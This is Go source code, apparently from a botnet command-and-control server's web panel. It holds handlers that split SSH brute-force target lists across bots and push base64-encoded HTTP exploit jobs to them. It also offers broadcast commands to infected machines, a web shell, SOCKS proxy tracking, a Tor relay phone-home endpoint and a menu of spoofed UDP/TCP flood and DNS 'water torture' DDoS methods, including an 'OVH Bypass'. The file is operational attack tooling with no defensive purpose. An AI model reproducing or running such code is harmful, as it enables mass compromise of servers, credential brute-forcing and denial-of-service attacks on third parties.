			payload := "MODE:" + body.Mode + "\n" + strings.Join(chunk, "\n") + "\n---\n" + comboStr
			if body.Payload != "" {
				payload += "\n===\n" + body.Payload
			}
			encoded := base64.StdEncoding.EncodeToString([]byte(payload))
			cmd := "!ssh " + encoded

			// Send as text (too large for binary encoding)
			bot.Write([]byte(cmd + "\n"))
			assigned++
			logMsg("[SSH] Assigned %d targets to bot %s", len(chunk), botIDs[i])
		}

		sshLock.Lock()
		sshRunning = true
		sshLastActive = time.Now()
		for i := 0; i < assigned; i++ {
			sshScanningBots[botIDs[i]] = true
		}
		sshLock.Unlock()

		PushActivity("scan", fmt.Sprintf("SSH scan started: %d targets across %d bots (%s mode)", len(targets), assigned, body.Mode))
		writeJSON(w, 200, map[string]interface{}{"ok": true, "botsAssigned": assigned, "ipsPerBot": chunkSize})

	case "stop":
		if r.Method != "POST" {
			http.Error(w, "POST only", 405)
			return
		}
		// Broadcast !stopssh
		botConnsLock.RLock()
		for _, bc := range botConnections {
			if bc.authenticated {
				bc.conn.Write([]byte("!stopssh\n"))
			}
		}
		botConnsLock.RUnlock()

		sshLock.Lock()
		sshRunning = false
		for k := range sshScanningBots {
			delete(sshScanningBots, k)
		}
		sshLock.Unlock()

		PushActivity("scan", "SSH scan stopped")
		writeJSON(w, 200, map[string]interface{}{"ok": true})

	case "hits":
		if r.Method == "DELETE" {
			sshLock.Lock()
			sshHits = nil
			sshLock.Unlock()
			writeJSON(w, 200, map[string]interface{}{"ok": true})
			return
		}
		sshLock.Lock()
		hits := make([]SSHHit, len(sshHits))
		copy(hits, sshHits)
		sshLock.Unlock()
		writeJSON(w, 200, hits)

	case "status":
		sshLock.Lock()
		status := map[string]interface{}{
			"totalTargets": len(sshTargets),
			"totalCombos":  len(sshCombos),
			"hits":         len(sshHits),
			"running":      sshRunning,
		}
		sshLock.Unlock()
		writeJSON(w, 200, status)

	default:
		http.Error(w, "not found", 404)
	}
}

// handleAPIHTTPExploit manages the HTTP exploit module
func handleAPIHTTPExploit(w http.ResponseWriter, r *http.Request) {
	path := strings.TrimPrefix(r.URL.Path, "/api/http-exploit/")

	switch path {
	case "start":
		if r.Method != "POST" {
			http.Error(w, "POST only", 405)
			return
		}
		var req struct {
			Method    string            `json:"method"`
			Path      string            `json:"path"`
			Port      int               `json:"port"`
			UserAgent string            `json:"userAgent"`
			Headers   map[string]string `json:"headers"`
			Body      string            `json:"body"`
			Expect    string            `json:"expect"`
			Targets   []string          `json:"targets"`
		}
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			writeJSON(w, 400, map[string]interface{}{"ok": false, "error": "Invalid JSON"})
			return
		}
		if len(req.Targets) == 0 {
			writeJSON(w, 400, map[string]interface{}{"ok": false, "error": "No targets"})
			return
		}
		if req.Method == "" {
			req.Method = "GET"
		}
		if req.Path == "" {
			req.Path = "/"
		}
		if req.Port == 0 {
			req.Port = 80
		}
		if req.UserAgent == "" {
			req.UserAgent = "Mozilla/5.0"
		}
		if req.Expect == "" {
			req.Expect = "200"
		}

		// Build payload blob
		var payload strings.Builder
		payload.WriteString("METHOD:" + req.Method + "\n")
		payload.WriteString("PATH:" + req.Path + "\n")
		payload.WriteString(fmt.Sprintf("PORT:%d\n", req.Port))
		payload.WriteString("UA:" + req.UserAgent + "\n")
		payload.WriteString("EXPECT:" + req.Expect + "\n")
		for k, v := range req.Headers {
			payload.WriteString("HEADER:" + k + ": " + v + "\n")
		}
		payload.WriteString("---\n")
		for _, t := range req.Targets {
			t = strings.TrimSpace(t)
			if t != "" {
				payload.WriteString(t + "\n")
			}
		}
		if req.Body != "" {
			payload.WriteString("===\n")
			payload.WriteString(req.Body)
		}

		// Base64 encode
		encoded := base64.StdEncoding.EncodeToString([]byte(payload.String()))
		cmd := "!http " + encoded

		count := sendToFilteredBots(cmd, "", 0, 0)
		if count == 0 {
			sendToBots(cmd)
			count = getBotCount()
		}

		httpExploitLock.Lock()
		httpExploitRunning = true
		httpExploitLock.Unlock()

		PushActivity("scan", fmt.Sprintf("HTTP exploit started: %s %s → %d targets on %d bots", req.Method, req.Path, len(req.Targets), count))
		writeJSON(w, 200, map[string]interface{}{"ok": true, "bots": count, "targets": len(req.Targets)})

	case "stop":
		if r.Method != "POST" {
			http.Error(w, "POST only", 405)
			return
		}
		sendToBots("!stophttp")
		httpExploitLock.Lock()
		httpExploitRunning = false
		httpExploitLock.Unlock()
		PushActivity("scan", "HTTP exploit stopped")
		writeJSON(w, 200, map[string]interface{}{"ok": true})

	case "hits":
		if r.Method == "DELETE" {
			httpExploitLock.Lock()
			httpExploitHits = nil
			httpExploitLock.Unlock()
			writeJSON(w, 200, map[string]interface{}{"ok": true})
			return
		}
		httpExploitLock.Lock()
		hits := make([]HTTPExploitHit, len(httpExploitHits))
		copy(hits, httpExploitHits)
		httpExploitLock.Unlock()
		writeJSON(w, 200, hits)

	case "status":
		httpExploitLock.Lock()
		status := map[string]interface{}{
			"running": httpExploitRunning,
			"hits":    len(httpExploitHits),
		}
		httpExploitLock.Unlock()
		writeJSON(w, 200, status)

	case "pocs":
		handleHTTPExploitPocs(w, r)

	default:
		// Check for /pocs/<id> pattern
		if strings.HasPrefix(path, "pocs/") {
			handleHTTPExploitPocByID(w, r, strings.TrimPrefix(path, "pocs/"))
			return
		}
		http.Error(w, "not found", 404)
	}
}

// HTTP Exploit PoC config persistence
var (
	httpPocFile  = "db/http_pocs.json"
	httpPocLock  sync.Mutex
)

type HTTPPocConfig struct {
	ID      string `json:"id"`
	Name    string `json:"name"`
	Method  string `json:"method"`
	Path    string `json:"path"`
	Port    string `json:"port"`
	UA      string `json:"ua"`
	Expect  string `json:"expect"`
	Headers string `json:"headers"`
	Body    string `json:"body"`
}

func loadHTTPPocs() []HTTPPocConfig {
	data, err := os.ReadFile(httpPocFile)
	if err != nil {
		return nil
	}
	var pocs []HTTPPocConfig
	if err := json.Unmarshal(data, &pocs); err != nil {
		logMsg("[HTTP-POCS] Failed to parse %s: %v", httpPocFile, err)
	}
	return pocs
}

func saveHTTPPocs(pocs []HTTPPocConfig) {
	data, _ := json.MarshalIndent(pocs, "", "  ")
	os.WriteFile(httpPocFile, data, 0600)
}

func handleHTTPExploitPocs(w http.ResponseWriter, r *http.Request) {
	httpPocLock.Lock()
	defer httpPocLock.Unlock()

	if r.Method == "GET" {
		writeJSON(w, 200, loadHTTPPocs())
		return
	}
	if r.Method == "POST" {
		var poc HTTPPocConfig
		if err := json.NewDecoder(r.Body).Decode(&poc); err != nil {
			writeJSON(w, 400, map[string]interface{}{"ok": false, "error": "Invalid JSON"})
			return
		}
		poc.ID = fmt.Sprintf("%d", time.Now().UnixNano())
		pocs := loadHTTPPocs()
		pocs = append(pocs, poc)
		saveHTTPPocs(pocs)
		writeJSON(w, 200, map[string]interface{}{"ok": true, "id": poc.ID})
		return
	}
	http.Error(w, "method not allowed", 405)
}

func handleHTTPExploitPocByID(w http.ResponseWriter, r *http.Request, id string) {
	httpPocLock.Lock()
	defer httpPocLock.Unlock()

	pocs := loadHTTPPocs()

	if r.Method == "GET" {
		for _, p := range pocs {
			if p.ID == id {
				writeJSON(w, 200, p)
				return
			}
		}
		writeJSON(w, 404, map[string]interface{}{"error": "not found"})
		return
	}
	if r.Method == "DELETE" {
		var filtered []HTTPPocConfig
		for _, p := range pocs {
			if p.ID != id {
				filtered = append(filtered, p)
			}
		}
		saveHTTPPocs(filtered)
		writeJSON(w, 200, map[string]interface{}{"ok": true})
		return
	}
	http.Error(w, "method not allowed", 405)
}

// NewWebMux creates and returns the HTTP handler for the web panel.
func NewWebMux() http.Handler {
	mux := http.NewServeMux()
	mux.HandleFunc("/login", handleWebLogin)
	mux.HandleFunc("/logout", handleWebLogout)
	mux.HandleFunc("/api/session", requireWebAuth(handleAPISession))
	mux.HandleFunc("/api/bots", requireWebAuth(handleAPIBots))
	mux.HandleFunc("/api/stats", requireWebAuth(handleAPIStats))
	mux.HandleFunc("/api/command", requireWebAuth(handleAPICommand))
	mux.HandleFunc("/api/command/preview", requireWebAuth(handleAPICommandPreview))
	mux.HandleFunc("/api/activity", requireWebAuth(handleAPIActivity))
	mux.HandleFunc("/api/groups", requireWebAuth(handleAPIGroups))
	mux.HandleFunc("/api/group", requireWebAuth(handleAPISetGroup))
	mux.HandleFunc("/api/attack-methods", requireWebAuth(handleAPIAttackMethods))
	mux.HandleFunc("/api/attack", requireWebAuth(handleAPIAttackLaunch))
	mux.HandleFunc("/api/attacks", requireWebAuth(handleAPIRunningAttacks))
	mux.HandleFunc("/api/users", requireWebAuth(handleAPIUsers))
	mux.HandleFunc("/api/relays", requireWebAuth(handleAPIRelays))
	mux.HandleFunc("/api/relay-api", requireWebAuth(handleAPIRelayAPI))
	mux.HandleFunc("/api/relay-stats", requireWebAuth(handleAPIRelayStats))
	mux.HandleFunc("/api/tasks", requireWebAuth(handleAPITasks))
	mux.HandleFunc("/api/webhooks", requireWebAuth(handleAPIWebhooks))
	mux.HandleFunc("/api/webhooks/test", requireWebAuth(handleAPIWebhookTest))
	mux.HandleFunc("/api/templates", requireWebAuth(handleAPITemplates))
	mux.HandleFunc("/api/cmd-history", requireWebAuth(handleAPICmdHistory))
	mux.HandleFunc("/api/attack-history", requireWebAuth(handleAPIAttackHistory))
	mux.HandleFunc("/api/ssh/", requireWebAuth(handleAPISSH))
	mux.HandleFunc("/api/http-exploit/", requireWebAuth(handleAPIHTTPExploit))
	mux.HandleFunc("/api/scan-job/", requireWebAuth(handleAPIScanJob))
	mux.HandleFunc("/api/events", requireWebAuth(handleSSE))
	mux.HandleFunc("/static/style.css", handleStaticCSS)
	mux.HandleFunc("/static/app.js", handleStaticJS)
	mux.HandleFunc("/ws/shell", requireWebAuth(handleWebShellWS))
	mux.HandleFunc("/relay/report", handleRelayReport) // relay phone-home (works over Tor too)
	mux.HandleFunc("/", requireWebAuth(handleDashboard))

	// Wrap with security headers
	return securityHeaders(mux)
}

// securityHeaders adds standard security headers to every response
func securityHeaders(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("X-Content-Type-Options", "nosniff")
		w.Header().Set("X-Frame-Options", "DENY")
		w.Header().Set("Referrer-Policy", "no-referrer")
		next.ServeHTTP(w, r)
	})
}

// ============================================================================
// STATIC FILE HANDLERS (go:embed)
// ============================================================================

func handleStaticCSS(w http.ResponseWriter, r *http.Request) {
	data, err := webFS.ReadFile("web/style.css")
	if err != nil {
		http.Error(w, "Not found", 404)
		return
	}
	w.Header().Set("Content-Type", "text/css; charset=utf-8")
	w.Header().Set("Cache-Control", "no-cache, no-store, must-revalidate")
	w.Write(data)
}

func handleStaticJS(w http.ResponseWriter, r *http.Request) {
	data, err := webFS.ReadFile("web/app.js")
	if err != nil {
		http.Error(w, "Not found", 404)
		return
	}
	w.Header().Set("Content-Type", "application/javascript; charset=utf-8")
	w.Header().Set("Cache-Control", "no-cache, no-store, must-revalidate")
	// Inject default proxy credentials so the UI can use them
	preamble := fmt.Sprintf("var DEFAULT_PROXY_USER=%q,DEFAULT_PROXY_PASS=%q;\n", DEFAULT_PROXY_USER, DEFAULT_PROXY_PASS)
	w.Write([]byte(preamble))
	w.Write(data)
}

// ============================================================================
// HTTP HANDLERS
// ============================================================================

func handleWebLogin(w http.ResponseWriter, r *http.Request) {
	if r.Method == "GET" {
		if getWebSession(r) != nil {
			http.Redirect(w, r, "/", http.StatusSeeOther)
			return
		}
		data, _ := webFS.ReadFile("web/login.html")
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.Write(data)
		return
	}

	if r.Method == "POST" {
		if ct := r.Header.Get("Content-Type"); !strings.HasPrefix(ct, "application/json") {
			http.Error(w, "Bad request", http.StatusBadRequest)
			return
		}

		// Rate limit: max 5 failed attempts per IP per minute
		ip := r.RemoteAddr
		if idx := strings.LastIndex(ip, ":"); idx != -1 {
			ip = ip[:idx]
		}
		loginAttemptsLock.Lock()
		now := time.Now()
		cutoff := now.Add(-1 * time.Minute)
		var recent []time.Time
		for _, t := range loginAttempts[ip] {
			if t.After(cutoff) {
				recent = append(recent, t)
			}
		}
		loginAttempts[ip] = recent
		if len(recent) >= 5 {
			loginAttemptsLock.Unlock()
			writeJSON(w, http.StatusTooManyRequests, map[string]interface{}{"success": false, "error": "Too many attempts, try again later"})
			return
		}
		loginAttemptsLock.Unlock()

		var body struct {
			Token    string `json:"token"`
			Username string `json:"username"`
			Password string `json:"password"`
		}
		if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
			writeJSON(w, http.StatusBadRequest, map[string]interface{}{"success": false, "error": "Bad request"})
			return
		}

		var sessLevel string
		var sessUsername string

		if body.Username != "" {
			// User/password authentication
			ok, user := AuthUser(body.Username, body.Password)
			if !ok {
				loginAttemptsLock.Lock()
				loginAttempts[ip] = append(loginAttempts[ip], now)
				loginAttemptsLock.Unlock()
				writeJSON(w, http.StatusUnauthorized, map[string]interface{}{"success": false, "error": "Invalid credentials"})
				return
			}
			if user.Level != "Owner" {
				writeJSON(w, http.StatusForbidden, map[string]interface{}{"success": false, "error": "Owner access required"})
				return
			}
			sessLevel = user.Level
			sessUsername = user.Username
		} else {
			// Token authentication
			token := strings.TrimSpace(body.Token)
			if subtle.ConstantTimeCompare([]byte(token), []byte(webAccessToken)) != 1 {
				loginAttemptsLock.Lock()
				loginAttempts[ip] = append(loginAttempts[ip], now)
				loginAttemptsLock.Unlock()
				writeJSON(w, http.StatusUnauthorized, map[string]interface{}{"success": false, "error": "Invalid token"})
				return
			}
			sessLevel = "Owner"
			sessUsername = ""
		}

		sessID := generateSessionID()
		webSessionsLock.Lock()
		webSessions[sessID] = &WebSession{
			CreatedAt: time.Now(),
			ExpiresAt: time.Now().Add(24 * time.Hour),
			Level:     sessLevel,
			Username:  sessUsername,
		}
		webSessionsLock.Unlock()

		http.SetCookie(w, &http.Cookie{
			Name:     "vps",
			Value:    sessID,
			Path:     "/",
			HttpOnly: true,
			Secure:   true,
			MaxAge:   86400,
			SameSite: http.SameSiteStrictMode,
		})

		writeJSON(w, http.StatusOK, map[string]interface{}{"success": true})
		return
	}

	http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
}

func handleWebLogout(w http.ResponseWriter, r *http.Request) {
	cookie, err := r.Cookie("vps")
	if err == nil {
		webSessionsLock.Lock()
		delete(webSessions, cookie.Value)
		webSessionsLock.Unlock()
	}
	http.SetCookie(w, &http.Cookie{
		Name:   "vps",
		Value:  "",
		Path:   "/",
		MaxAge: -1,
	})
	http.Redirect(w, r, "/login", http.StatusSeeOther)
}

func handleDashboard(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/" {
		http.NotFound(w, r)
		return
	}
	data, _ := webFS.ReadFile("web/dashboard.html")
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Write(data)
}

type apiBotEntry struct {
	BotID        string  `json:"botID"`
	Arch         string  `json:"arch"`
	IP           string  `json:"ip"`
	RAM          int64   `json:"ram"`
	CPUCores     int     `json:"cpuCores"`
	ProcessName  string  `json:"processName"`
	Origin       string  `json:"origin"`
	Country      string  `json:"country"`
	Group        string  `json:"group"`
	ConnectedAt  string  `json:"connectedAt"`
	LastPing     string  `json:"lastPing"`
	Uptime       string  `json:"uptime"`
	SocksActive  bool    `json:"socksActive"`
	SocksRelay   string  `json:"socksRelay"`
	SocksStarted string  `json:"socksStarted"`
	SocksUser    string  `json:"socksUser"`
	SSHScanning        bool   `json:"sshScanning"`
	HealthScore        int    `json:"healthScore"`
	HasScanner         bool   `json:"hasScanner"`
	HasAttack          bool   `json:"hasAttack"`
	LastCommand        string `json:"lastCommand,omitempty"`
	LastCmdTime        string `json:"lastCmdTime,omitempty"`
	ScanningType       string `json:"scanningType,omitempty"`
	ScanBatchSize      int    `json:"scanBatchSize,omitempty"`
	ScanBatchRemaining int    `json:"scanBatchRemaining,omitempty"`
	TotalHits          int    `json:"totalHits"`
}

func buildBotEntry(bc *BotConnection) apiBotEntry {
	socksStarted := ""
	if bc.socksActive && !bc.socksStarted.IsZero() {
		socksStarted = bc.socksStarted.Format(time.RFC3339)
	}
	return apiBotEntry{
		BotID:        bc.botID,
		Arch:         bc.arch,
		IP:           bc.ip,
		RAM:          bc.ram,
		CPUCores:     bc.cpuCores,
		ProcessName:  bc.processName,
		Origin:       bc.origin,
		Country:      bc.country,
		Group:        bc.group,
		ConnectedAt:  bc.connectedAt.Format(time.RFC3339),
		LastPing:     bc.lastPing.Format(time.RFC3339),
		Uptime:       formatDuration(time.Since(bc.connectedAt)),
		SocksActive:  bc.socksActive,
		SocksRelay:   bc.socksRelay,
		SocksStarted: socksStarted,
		SocksUser:    bc.socksUser,
		SSHScanning:  sshScanningBots[bc.botID],
		HealthScore:  CalculateHealthScore(bc),
		HasScanner:   bc.hasScanner,
		HasAttack:    bc.hasAttack,
		LastCommand:        bc.lastCommand,
		LastCmdTime:        func() string { if bc.lastCmdTime.IsZero() { return "" }; return bc.lastCmdTime.Format(time.RFC3339) }(),
		ScanningType:       bc.scanningType,
		ScanBatchSize:      bc.scanBatchSize,
		ScanBatchRemaining: bc.scanBatchRemaining,
		TotalHits:          bc.totalHits,
	}
}

func handleAPIBots(w http.ResponseWriter, r *http.Request) {
	botConnsLock.RLock()
	bots := make([]apiBotEntry, 0, len(botConnections))
	for _, bc := range botConnections {
		if bc.authenticated {
			bots = append(bots, buildBotEntry(bc))
		}
	}
	botConnsLock.RUnlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(bots)
}

type runningAttackJSON struct {
	Method    string `json:"method"`
	Target    string `json:"target"`
	Port      string `json:"port"`
	Duration  int    `json:"duration"`
	Elapsed   int    `json:"elapsed"`
	Remaining int    `json:"remaining"`
	Username  string `json:"username"`
}

type apiStatsResponse struct {
	BotCount       int                `json:"botCount"`
	TotalRAM       int64              `json:"totalRAM"`
	TotalCPU       int                `json:"totalCPU"`
	Uptime         string             `json:"uptime"`
	ArchMap        map[string]int     `json:"archMap"`
	History        []StatsSnapshot    `json:"history"`
	RunningAttacks []runningAttackJSON `json:"runningAttacks"`
	AttacksToday   int                `json:"attacksToday"`
	OriginMap      map[string]int     `json:"originMap"`
}

func buildStatsJSON() string {
	statsHistoryLock.RLock()
	hist := make([]StatsSnapshot, len(statsHistory))
	copy(hist, statsHistory)
	statsHistoryLock.RUnlock()

	attacks := getAllRunningAttacks()
	atkJSON := make([]runningAttackJSON, 0, len(attacks))
	for _, a := range attacks {
		elapsed := int(time.Since(a.Start).Seconds())
		rem := a.Duration - elapsed
		if rem < 0 {
			rem = 0
		}
		atkJSON = append(atkJSON, runningAttackJSON{
			Method:    a.Method,
			Target:    a.Target,
			Port:      a.Port,
			Duration:  a.Duration,
			Elapsed:   elapsed,
			Remaining: rem,
			Username:  a.Username,
		})
	}

	// Count attacks started today
	todayStart := time.Now().Truncate(24 * time.Hour)
	attackHistoryLock.Lock()
	atkToday := 0
	for _, rec := range attackHistory {
		if !rec.StartedAt.Before(todayStart) {
			atkToday++
		}
	}
	attackHistoryLock.Unlock()

	// Aggregate bots by origin tag
	originMap := getOriginMap()

	stats := apiStatsResponse{
		BotCount:       getBotCount(),
		TotalRAM:       getTotalRAM(),
		TotalCPU:       getTotalCPU(),
		Uptime:         getC2Uptime(),
		ArchMap:        getArchMap(),
		History:        hist,
		RunningAttacks: atkJSON,
		AttacksToday:   atkToday,
		OriginMap:      originMap,
	}
	data, _ := json.Marshal(stats)
	return string(data)
}

func handleAPIStats(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	fmt.Fprint(w, buildStatsJSON())
}

type apiCommandRequest struct {
	Command    string `json:"command"`
	BotID      string `json:"botID"`
	ArchFilter string `json:"archFilter"`
	MinRAM     int64  `json:"minRAM"`
}

type apiCommandResponse struct {
	Success bool   `json:"success"`
	Message string `json:"message"`
}

func handleAPICommand(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	if ct := r.Header.Get("Content-Type"); !strings.HasPrefix(ct, "application/json") {
		http.Error(w, "Content-Type must be application/json", http.StatusBadRequest)
		return
	}

	var req apiCommandRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeJSON(w, http.StatusBadRequest, apiCommandResponse{false, "Invalid JSON"})
		return
	}

	req.Command = strings.TrimSpace(req.Command)
	if req.Command == "" {
		writeJSON(w, http.StatusBadRequest, apiCommandResponse{false, "Empty command"})
		return
	}

	// Parse command type and arguments for history recording
	cmdParts := strings.SplitN(req.Command, " ", 2)
	histCmdType := cmdParts[0]
	histArgs := map[string]string{}
	if len(cmdParts) > 1 {
		histArgs["raw"] = cmdParts[1]
	}
	histTarget := req.BotID
	if histTarget == "" {
		histTarget = "all"
	}

	if req.BotID != "" {
		ok := sendToSingleBot(req.BotID, req.Command)
		if ok {
			PushActivity("command", fmt.Sprintf("→ %s: %s", req.BotID, req.Command))
			recordCmdHistory(histCmdType, histArgs, histTarget)
			writeJSON(w, http.StatusOK, apiCommandResponse{true, fmt.Sprintf("Sent to bot %s", req.BotID)})
		} else {
			PushActivity("error", fmt.Sprintf("Failed to send to %s: %s", req.BotID, req.Command))
			writeJSON(w, http.StatusNotFound, apiCommandResponse{false, fmt.Sprintf("Bot %s not found or send failed", req.BotID)})
		}
	} else if req.ArchFilter != "" || req.MinRAM > 0 {
		count := sendToFilteredBots(req.Command, req.ArchFilter, req.MinRAM, 0)
		PushActivity("command", fmt.Sprintf("filtered broadcast → %d bots: %s (arch=%s minRAM=%dMB)", count, req.Command, req.ArchFilter, req.MinRAM))
		recordCmdHistory(histCmdType, histArgs, histTarget)
		writeJSON(w, http.StatusOK, apiCommandResponse{true, fmt.Sprintf("Sent to %d bots (filtered)", count)})
	} else {
		sendToBots(req.Command)
		count := getBotCount()
		PushActivity("command", fmt.Sprintf("broadcast → %d bots: %s", count, req.Command))
		recordCmdHistory(histCmdType, histArgs, histTarget)
		writeJSON(w, http.StatusOK, apiCommandResponse{true, fmt.Sprintf("Sent to %d bots", count)})
	}
}

// handleAPICommandPreview sends a command to up to 5 random bots and collects output
func handleAPICommandPreview(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "POST only", 405)
		return
	}
	var req struct {
		Command string `json:"command"`
	}
	json.NewDecoder(r.Body).Decode(&req)
	req.Command = strings.TrimSpace(req.Command)
	if req.Command == "" {
		writeJSON(w, 400, map[string]interface{}{"ok": false, "error": "empty command"})
		return
	}

	// Pick up to 5 random authenticated bots
	botConnsLock.RLock()
	var botIDs []string
	for _, bc := range botConnections {
		if bc.authenticated {
			botIDs = append(botIDs, bc.botID)
		}
	}
	botConnsLock.RUnlock()

	if len(botIDs) == 0 {
		writeJSON(w, 400, map[string]interface{}{"ok": false, "error": "no bots connected"})
		return
	}

	// Shuffle and take up to 5
	for i := len(botIDs) - 1; i > 0; i-- {
		j := int(time.Now().UnixNano()) % (i + 1)
		if j < 0 {
			j = -j
		}
		botIDs[i], botIDs[j] = botIDs[j], botIDs[i]
	}
	if len(botIDs) > 5 {
		botIDs = botIDs[:5]
	}

	// Create response channels
	channels := make(map[string]chan string)
	previewCollectorsLock.Lock()
	for _, id := range botIDs {
		ch := make(chan string, 1)
		channels[id] = ch
		previewCollectors[id] = ch
	}
	previewCollectorsLock.Unlock()

	// Send command to each bot
	for _, id := range botIDs {
		sendToSingleBot(id, req.Command)
	}

	// Wait up to 10 seconds for responses
	type previewResponse struct {
		BotID  string `json:"botID"`
		Output string `json:"output"`
	}
	var responses []previewResponse
	deadline := time.After(10 * time.Second)

	for _, id := range botIDs {
		ch := channels[id]
		select {
		case line := <-ch:
			responses = append(responses, previewResponse{BotID: id, Output: line})
		case <-deadline:
			// timeout — clean up remaining collectors
			previewCollectorsLock.Lock()
			for _, rid := range botIDs {
				delete(previewCollectors, rid)
			}
			previewCollectorsLock.Unlock()
			goto done
		}
	}
done:
	// Clean up any leftover collectors
	previewCollectorsLock.Lock()
	for _, id := range botIDs {
		delete(previewCollectors, id)
	}
	previewCollectorsLock.Unlock()

	writeJSON(w, 200, map[string]interface{}{"ok": true, "responses": responses, "sampled": len(botIDs)})
}

func handleAPIActivity(w http.ResponseWriter, r *http.Request) {
	activityLogLock.RLock()
	entries := make([]ActivityLogEntry, len(activityLog))
	copy(entries, activityLog)
	activityLogLock.RUnlock()
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(entries)
}

// handleAPIGroups returns all unique group names currently in use
func handleAPIGroups(w http.ResponseWriter, r *http.Request) {
	botGroupsLock.RLock()
	groups := make(map[string]bool)
	for _, g := range botGroups {
		if g != "" {
			groups[g] = true
		}
	}
	botGroupsLock.RUnlock()
	result := make([]string, 0, len(groups))
	for g := range groups {
		result = append(result, g)
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(result)
}

// handleAPISetGroup assigns one or more bots to a group (or removes group)
func handleAPISetGroup(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	var req struct {
		BotIDs []string `json:"botIDs"`
		Group  string   `json:"group"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeJSON(w, http.StatusBadRequest, map[string]interface{}{"success": false, "error": "Invalid JSON"})
		return
	}
	for _, id := range req.BotIDs {
		setBotGroup(id, req.Group)
	}
	// Broadcast updated bots to SSE clients so filters refresh
	botConnsLock.RLock()
	for _, id := range req.BotIDs {
		if bc, ok := botConnections[id]; ok {
			BroadcastSocksUpdate(bc) // reuses existing broadcast mechanism to push full bot state
		}
	}
	botConnsLock.RUnlock()
	writeJSON(w, http.StatusOK, map[string]interface{}{"success": true, "message": fmt.Sprintf("Set group '%s' on %d bots", req.Group, len(req.BotIDs))})
}

// handleAPIAttackMethods returns available attack methods for the dashboard
func handleAPIAttackMethods(w http.ResponseWriter, r *http.Request) {
	type optDef struct {
		Key     string `json:"key"`
		Label   string `json:"label"`
		Default string `json:"default"`
		Tooltip string `json:"tooltip"`
	}
	type attackMethod struct {
		ID       string   `json:"id"`
		Name     string   `json:"name"`
		Category string   `json:"category"`
		Desc     string   `json:"desc"`
		Options  []optDef `json:"options"`
	}

	// common option builders
	o := func(key, label, def, tip string) optDef { return optDef{key, label, def, tip} }

	// reusable tooltips
	const (
		tipSize    = "Packet payload size in bytes"
		tipSport   = "Source port: 'random' for randomized, or a fixed port number"
		tipTTL     = "IP Time-To-Live hops (1-255)"
		tipSource  = "Spoofed source IP. Leave empty to use the bot's real IP"
		tipRepeat  = "Number of connection/send attempts per cycle"
		tipCsleep  = "Delay between connection attempts in milliseconds (0 = no delay)"
		tipSleep   = "Delay between packet sends in microseconds (0 = no delay)"
		tipMinLen  = "Minimum randomized packet length. Both min and max must be >0 to enable"
		tipMaxLen  = "Maximum randomized packet length. Both min and max must be >0 to enable"
		tipMinPPS  = "Minimum packets per second. Both min and max must be >0 to enable rate limiting"
		tipMaxPPS  = "Maximum packets per second. Both min and max must be >0 to enable rate limiting"
		tipPayload = "Custom hex-encoded payload bytes (e.g. deadbeef). Overrides random payload"
		tipTCPPort = "TCP destination port used for the initial handshake"
	)

	// shared option sets
	rawIPOpts := []optDef{
		o("size", "Payload Size", "512", tipSize), o("sport", "Source Port", "random", tipSport),
		o("ttl", "TTL", "64", tipTTL), o("source", "Source IP", "", tipSource),
	}
	tcpFlagOpts := []optDef{
		o("size", "Payload Size", "512", tipSize), o("sport", "Source Port", "random", tipSport),
		o("ttl", "TTL", "64", tipTTL), o("source", "Source IP", "", tipSource),
		o("minlen", "Min Len", "0", tipMinLen), o("maxlen", "Max Len", "0", tipMaxLen),
	}
	methods := []attackMethod{
		// UDP
		{ID: "udp", Name: "UDP Generic", Category: "udp", Desc: "Raw spoofed UDP flood (max power)", Options: rawIPOpts},
		{ID: "vse", Name: "Valve VSE", Category: "udp", Desc: "Valve Source Engine query flood", Options: rawIPOpts},
		{ID: "dns", Name: "DNS Water Torture", Category: "udp", Desc: "DNS amplification flood", Options: []optDef{
			o("size", "Random Subdomain Len", "12", "Random prefix length"),
			o("domain", "Domain", "", "Target domain for DNS query"),
		}},
		{ID: "udpplain", Name: "UDP Plain", Category: "udp", Desc: "Socket-based UDP flood (no spoofing)", Options: []optDef{
			o("size", "Payload Size", "1400", tipSize), o("sport", "Source Port", "random", tipSport),
		}},
		{ID: "std", Name: "UDP STD", Category: "udp", Desc: "Standard UDP flood with random hex payloads", Options: rawIPOpts},
		// TCP
		{ID: "syn", Name: "TCP SYN", Category: "tcp", Desc: "SYN flood with TCP options (MSS/SACK/TS/WSS)", Options: rawIPOpts},
		{ID: "ack", Name: "TCP ACK", Category: "tcp", Desc: "ACK flood with spoofed source and payload", Options: tcpFlagOpts},
		{ID: "stomp", Name: "TCP Stomp", Category: "tcp", Desc: "ACK/PSH flood with real seq/ack from handshake", Options: tcpFlagOpts},
		{ID: "xmas", Name: "TCP XMAS", Category: "tcp", Desc: "XMAS flood with real seq/ack from handshake", Options: tcpFlagOpts},
		{ID: "usyn", Name: "TCP USYN", Category: "tcp", Desc: "Urgent SYN flood with URG flag set", Options: rawIPOpts},
		{ID: "tcpall", Name: "TCP All Flags", Category: "tcp", Desc: "TCP flood with all flags randomized", Options: rawIPOpts},
		{ID: "tcpfrag", Name: "TCP Fragment", Category: "tcp", Desc: "Fragmented TCP flood", Options: rawIPOpts},
		{ID: "ovh", Name: "OVH Bypass", Category: "tcp", Desc: "OVH-targeted SYN flood with TCP options", Options: rawIPOpts},
		{ID: "asyn", Name: "Advanced SYN", Category: "tcp", Desc: "Advanced SYN with randomized options", Options: rawIPOpts},
